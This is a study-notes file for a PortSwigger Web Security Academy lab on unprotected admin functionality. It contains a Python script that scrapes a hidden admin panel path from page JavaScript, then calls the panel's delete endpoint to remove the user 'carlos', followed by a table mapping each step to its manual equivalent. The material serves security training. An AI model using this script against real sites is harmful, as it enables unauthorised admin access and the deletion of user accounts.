# Access Control — Scripts (Reference)
> PortSwigger Web Security Academy | Access Control Module

> **Note**: Labs were solved manually using Burp Suite and browser dev tools.
> These scripts are for future reference and automation practice — not used during lab completion.

---

## Lab: Unprotected Admin Functionality with Unpredictable URL

**Vulnerability**: Admin panel URL is hidden but leaked inside the page's JavaScript source code.

**Attack logic**:
1. Fetch the homepage
2. Extract the admin path from JavaScript using regex
3. Access the admin panel
4. Delete user `carlos`

```python
import requests
import re

# Replace with your actual lab URL
LAB_URL = "https://YOUR-LAB-ID.web-security-academy.net"

session = requests.Session()

# Step 1: Fetch the homepage
print("[*] Fetching homepage...")
response = session.get(LAB_URL)

# Step 2: Extract the admin path from JavaScript in the source
print("[*] Searching for admin panel URL in page source...")
match = re.search(r"adminPanelPath\s*=\s*'(/[^']+)'", response.text)

if not match:
    print("[-] Admin path not found. Check the page source manually.")
    exit()

admin_path = match.group(1)
print(f"[+] Found admin panel at: {admin_path}")

# Step 3: Access the admin panel
admin_url = LAB_URL + admin_path
print(f"[*] Accessing admin panel: {admin_url}")
admin_response = session.get(admin_url)

if "carlos" not in admin_response.text:
    print("[-] Could not find user 'carlos' in admin panel.")
    exit()

print("[+] Admin panel accessed. Found user carlos.")

# Step 4: Delete carlos
delete_url = f"{admin_url}/delete?username=carlos"
print(f"[*] Deleting carlos: {delete_url}")
delete_response = session.get(delete_url)

if delete_response.status_code in [200, 302]:
    print("[+] Carlos deleted! Lab should be solved.")
else:
    print(f"[-] Unexpected response: {delete_response.status_code}")
```

> **Note**: The regex pattern may need adjusting depending on the exact JS variable name in your lab instance. Always check the page source first.

---

## Notes on Script Usage

These scripts automate what you would do manually in Burp Suite. Understanding **why** each request is made matters more than memorizing the code.

| Script step | What it maps to manually |
|---|---|
| `session.get(LAB_URL)` | Opening the homepage in browser |
| `re.search(...)` | Reading the JS in page source (Ctrl+U) |
| `session.get(admin_url)` | Navigating to the admin panel |
| `session.get(delete_url)` | Clicking delete on carlos |
